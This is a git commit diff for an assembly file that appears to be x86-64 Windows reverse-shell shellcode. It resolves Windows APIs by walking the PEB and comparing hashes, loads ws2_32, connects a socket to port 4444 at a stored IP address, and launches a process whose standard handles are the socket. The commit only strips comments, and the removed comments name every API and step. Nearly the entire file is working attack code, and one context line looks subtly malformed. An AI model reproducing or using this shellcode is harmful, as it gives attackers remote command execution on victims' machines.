4c99ef5b7a36a625ab373f0b08cfa1047d8a0391
Anaz <132905477+anaz-s@users.noreply.github.com>
2025-02-06 03:23:10 +0100

    Removed comments

--- src/main.asm
+++ src/main.asm
@@ -2,92 +2,92 @@ bits 64
 
 _start:
     and rsp, -16
-    mov r11d, 0xEC0E4E8E        ; LoadLibraryA
+    mov r11d, 0xEC0E4E8E        
 kernel32:
-    mov rdx, [gs:0x60]      ; module peb
-    mov rdx, [rdx+0x18]      ; module ldr field
-    mov rdx, [rdx+0x20]      ; InMemoryOrderList first entry points to the primary module
-    mov rdx, [rdx]          ; ntdll
-    mov rdx, [rdx]          ; kernel32
-    mov rdx, [rdx+0x20]     ; kernel32 base addrs
+    mov rdx, [gs:0x60]      
+    mov rdx, [rdx+0x18]      
+    mov rdx, [rdx+0x20]      
+    mov rdx, [rdx]          
+    mov rdx, [rdx]          
+    mov rdx, [rdx+0x20]     
     xor r15, r15
 
-    cmp r13b, 0x01              ; not so random check
+    cmp r13b, 0x01              
     je setup_proc.cont
 
 .resolve_export:
-    mov eax, [rdx+0x3C]      ; e_lfanew
-    add rax, rdx            ; ntsig
+    mov eax, [rdx+0x3C]      
+    add rax, rdx            
 
-    mov ebx, [rax+0x88]      ; image data dir virtual address[0]
-    add rbx, rdx            ; image export dir va
+    mov ebx, [rax+0x88]      
+    add rbx, rdx            
 
-    mov ecx, [rbx+0x18]       ; no of names
+    mov ecx, [rbx+0x18]       
 
-    mov r8d, [rbx+0x20]      ; address of names rva
-    add r8, rdx             ; array of address of names rvas
+    mov r8d, [rbx+0x20]      
+    add r8, rdx             
  
 hash_loop:
-    mov esi, [r8 + r15 * 0x04]     ; address of name rva
-    add rsi, rdx    ;           name va
+    mov esi, [r8 + r15 * 0x04]     
+    add rsi, rdx    
     xor eax, eax
-    xor r9, r9      ; hash accumulator
+    xor r9, r9      
 .hash_func:
-    lodsb   ; take 1 byte from rsi to al
-    test al, al     ; check if end of string
+    lodsb   
+    test al, al     
     jz .hash_done   
-    ror r9d, 0xd     ; rotate lower 32 bits by 13 bits
-    add r9d, eax    ; add char to hash accumulator
-    jmp .hash_func  ; loop
+    ror r9d, 0xd     
+    add r9d, eax    
+    jmp .hash_func  
 .hash_done:
-    cmp r9d, r11d   ; check if its the right function hash
-    je .found       ; if it is
-    inc r15d        ; inc index
-    loop hash_loop  ; dec number of names
+    cmp r9d, r11d   
+    je .found       
+    inc r15d        
+    loop hash_loop  
 .found:
-    mov eax, [rbx+0x24]  ; address of ordinals rva
-    add rax, rdx        ; address of ordinals va
-    movzx rcx, word [rax + r15 * 0x02]     ; get function ordinal
+    mov eax, [rbx+0x24]  
+    add rax, rdx        
+    movzx rcx, word [rax + r15 * 0x02]     
 
-    mov eax, [rbx+0x1C]      ; rva of function addresses
-    add rax, rdx        ; va to array of function addresses
-    mov eax, [rax + rcx * 0x04]    ; access function to find by index * 4 each function rva is a dword
-    add rax, rdx        ; function
-    cmp r11d, 0x3BFCEDCB    ; WSAStartup
+    mov eax, [rbx+0x1C]      
+    add rax, rdx        
+    mov eax, [rax + rcx * 0x04]    
+    add rax, rdx        
+    cmp r11d, 0x3BFCEDCB    
     je wsastartup
-    cmp r11d, 0xADF509D9    ; WSASocketA
+    cmp r11d, 0xADF509D9    
     je wsasocketa
-    cmp r11d, 0x4E121B69    ; inet_pton
+    cmp r11d, 0x4E121B69    
     je inet_pton
-    cmp r11d, 0xB32DBA0C    ; WSAConnect
+    cmp r11d, 0xB32DBA0C    
     je wsaconnect
-    cmp r11d, 0x16B3FE72    ; CreateProcessA
+    cmp r11d, 0x16B3FE72    
     je createprocessa
 loadlib:
-    lea rcx, [rel ws2_32]   ; access ws2_32 string
+    lea rcx, [rel ws2_32]   
     sub rsp, 0x20   
-    call rax    ; LoadLibraryA
-    add rsp, 0x20  ; restore stack
+    call rax    
+    add rsp, 0x20  
 
-    mov rdx, rax    ; rdx = ws2_32 dll base
+    mov rdx, rax    
     xor r15, r15
-    mov r11d, 0x3BFCEDCB    ; WSAStartup
+    mov r11d, 0x3BFCEDCB    
     jmp kernel32.resolve_export
 
 wsastartup:
-    push rdx    ; save base ---: misaligned
-    sub rsp, 0x1A8    ; wsadata
-    mov rcx, 0x202  ; version 2.2
-    mov rdx, rsp    ; lpwsadata
-    call rax    ; WSAStartup
-    add rsp, 0x1A8    ; restore stack
-    pop rdx     ; restore dll base
+    push rdx    
+    sub rsp, 0x1A8    
+    mov rcx, 0x202  
+    mov rdx, rsp    
+    call rax    
+    add rsp, 0x1A8    
+    pop rdx     
 
     xor r15, r15
-    mov r11d, 0xADF509D9        ; WSASocketA
+    mov r11d, 0xADF509D9        
     jmp kernel32.resolve_export
 wsasocketa:
-    push rdx    ; misaligned 
+    push rdx    
     sub rsp, 0x38
     mov rcx, 0x02
     mov rdx, 0x01
@@ -95,45 +95,45 @@ wsasocketa:
     xor r9, r9
     mov dword 0x20[rsp], 0
     mov dword 0x28[rsp], 0
-    call rax    ;   WSASocketA
+    call rax    
     mov rdi, rax
     add rsp, 0x38
-    pop rdx    ; restore stack
+    pop rdx    
     
     xor r15, r15
-    mov r11d, 0x4E121B69        ; inet_pton
+    mov r11d, 0x4E121B69        
     jmp kernel32.resolve_export
 
 inet_pton:
     push rdx
     sub rsp, 0x10
     mov word [rsp], 0x02
-    mov word [rsp+2], 0x5C11    ; 4444 in big endian
+    mov word [rsp+2], 0x5C11    
     
 
     mov cl, 0x02
     lea rdx, [rel ip]
     lea r8, [rsp+4]
-    call rax    ; inet_pton
+    call rax    
 
-    mov r14, rsp    ; sockin
+    mov r14, rsp    
 
     add rsp, 0x10
     pop rdx
     xor r15, r15
-    mov r11d, 0xB32DBA0C        ; WSAConnect
+    mov r11d, 0xB32DBA0C        
     jmp kernel32.resolve_export
 
 wsaconnect:
     sub rsp, 0x60
     mov rcx, rdi    
-    mov rdx, r14    ; sockin
+    mov rdx, r14    
     mov r8b, 0x1
     xor r9, r9
     mov qword [rsp+32], 0
     mov qword [rsp+40], 0
     mov qword [rsp+48], 0
-    call rax    ;    WSAConnect
+    call rax    
     add rsp, 0x60
 
 setup_proc:
@@ -141,10 +141,10 @@ setup_proc:
     jmp kernel32    
 .cont:
     xor r15, r15
-    mov r11d, 0x16B3FE72    ; CreateProcessA
+    mov r11d, 0x16B3FE72    
     jmp kernel32.resolve_export
 createprocessa:
-    sub rsp, 0x88    ; STARTUPINFOA + PROCESS_INFORMATION
+    sub rsp, 0x88    
     mov dword [rsp], 0x70
     mov dword [rsp+60], 0x00000100
     mov qword [rsp+80], rdi
@@ -167,7 +167,7 @@ createprocessa:
     mov qword [rsp+72], rbx
     call rax    CreateProcessA
     add rsp, 0x58
-    add rsp, 0x88    ;  Restore stack
+    add rsp, 0x88    
 done: 
     ret
 ws2_32:
